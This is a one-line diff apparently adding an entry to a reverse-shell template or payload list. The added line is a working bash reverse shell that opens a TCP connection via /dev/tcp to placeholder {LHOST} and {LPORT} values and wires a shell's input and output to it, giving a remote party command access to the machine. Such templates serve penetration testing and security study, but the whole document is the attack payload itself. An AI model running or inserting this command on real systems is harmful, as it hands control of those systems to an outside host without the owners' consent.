@@ -1,0 +1,1 @@
+exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196
